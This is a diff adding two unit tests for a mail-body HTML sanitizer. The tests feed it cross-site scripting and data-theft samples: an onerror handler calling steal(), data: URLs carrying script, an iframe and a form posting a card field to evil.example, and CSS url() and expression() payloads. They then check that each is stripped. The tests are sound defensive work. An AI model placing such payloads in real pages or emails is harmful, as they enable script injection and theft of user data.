@@ -37,6 +37,28 @@ describe('sanitizeMailBodyHtml for draft replies', () => {
     expect(html).not.toMatch(/javascript:/i);
   });
 
+  it('strips onerror, data: links, svg data images and embedded frames, objects and forms', () => {
+    const { html } = sanitizeMailBodyHtml(
+      '<img src="x" onerror="steal()"><img src="data:image/svg+xml;base64,PHN2Zz4=">' +
+        '<a href="data:text/html,<script>alert(1)</script>">d</a>' +
+        '<iframe src="https://evil.example"></iframe><object data="x"></object>' +
+        '<form action="https://evil.example"><input name="card"></form>',
+      OPTIONS,
+    );
+
+    expect(html).not.toMatch(/onerror|data:text|svg\+xml|<iframe|<object|<form|<input|evil/i);
+  });
+
+  it('drops url() and expression() even inside allowed style properties', () => {
+    const { html } = sanitizeMailBodyHtml(
+      '<p style="background-color:url(https://tracker.example/a.gif);width:expression(alert(1));font:12px url(https://tracker.example);padding:4px">x</p>',
+      OPTIONS,
+    );
+
+    expect(html).not.toMatch(/url\(|expression|tracker/);
+    expect(html).toContain('style="padding:4px"');
+  });
+
   it('keeps quote tables and their inline styles', () => {
     const { html } = sanitizeMailBodyHtml(QUOTE_REPLY, OPTIONS);
 
